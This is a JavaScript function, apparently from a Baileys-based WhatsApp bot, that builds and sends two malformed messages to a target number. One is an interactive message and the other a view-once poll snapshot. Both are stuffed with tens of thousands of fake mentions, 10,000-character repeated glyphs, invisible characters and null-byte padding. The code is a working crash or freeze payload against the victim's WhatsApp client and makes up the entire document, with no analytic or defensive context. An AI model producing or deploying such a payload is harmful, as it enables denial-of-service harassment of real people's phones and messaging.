async function DelayMbut(sock, target) {
  try {

   const Viona = await prepareWAMessageMedia({
      image: { 
        url: "https://files.catbox.moe/ptg0cq.jpg", 
        gifPlayback: true 
      }
    }, 
    {
      upload: sock.waUploadToServer,
      mediaType: "image"
    });
    
    Viona.hasMediaAttachment = true;
    Viona.title = "Rxcl | Information";
    
    const Arcane = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        interactiveMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => {
              return "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net";
            }),
            
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1@newsletter",
              newsletterName: "ꦾ".repeat(10000),
              serverMessageId: 1
            }
          },
          
          header: Viona,
          body: {
            text: "\u2063".repeat(10000)
          },
          
          footer: {
            text: ""
          },
          
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(10000),
                  url: "ꦾ".repeat(10000),
                  merchant_url: ""
                })
              },
              
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                  "screen_0_Dropdown_1": "Null",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            ]
          }
        }
      }),
      { quoted: null }
    );
    
    await sock.relayMessage(
      target,
      Arcane.message,
      { messageId: Math.random().toString(36).slice(2) + Date.now() }
    );
    
    const Reo = [target, "0@s.whatsapp.net"];
    for (let i = 0; i < 30000; i++) {
      Reo.push("1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
    }
    
    const Rxcl = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            pollResultSnapshotMessage: {
              pollCreationMessageKey: {
                remoteJid: target,
                fromMe: true,
                id: "1975"
              },
              
              voteCounts: [
                {
                  optionName: "\u000e.".repeat(9999) + "\u0007".repeat(9999),
                  count: 99999
                },
                
                {
                  optionName: "{(".repeat(50000),
                  count: 88888
                }
              ],
              
              totalCount: 188887,
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "1@newsletter",
                  serverMessageId: 11,
                  newsletterName: "Rxcl | Information",
                  mentionedJid: Reo
                }
              }
            }
          }
        }
      })
    );
     await sock.relayMessage(
      target,
      Rxcl.message,
      { messageId: Math.random().toString(36).slice(2) + Date.now() }
    );
    console.log("Berhasil ngirim:", target);

  } catch (error) {
    console.error("error atolil", error);
  }
}